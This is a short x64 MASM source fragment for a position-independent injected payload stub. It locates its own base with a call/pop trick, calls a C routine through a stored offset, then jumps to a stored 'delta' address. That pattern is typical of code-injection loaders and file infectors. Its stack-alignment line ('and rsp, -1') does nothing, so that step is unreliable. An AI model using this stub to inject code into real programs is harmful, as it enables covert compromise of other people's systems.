public payload
public __begin_of_code
public delta
public to_c_code

injected segment read execute

    __begin_of_code label BYTE
    payload proc

        call _next 
        _next:
            ; load rip into rbp
            pop rbp 
            ; substract _next offset (from section begin) from rip
            sub rbp, _next - payload

            ; align
            sub rsp, 16
            and rsp, -1 

            ; call inj_code_c
            mov rbx, [rbp + (to_c_code - __begin_of_code)]
            add rbx, rbp
            push 0
            call rbx
            pop rax 

            mov rbx, [rbp + (delta - __begin_of_code)]
            add rbx, rbp
            jmp rbx

        _end:
        to_c_code label QWORD 
            dq 0
        ;delta label SQWORD
        delta label QWORD
            dq 0
    payload endp

injected ends

END
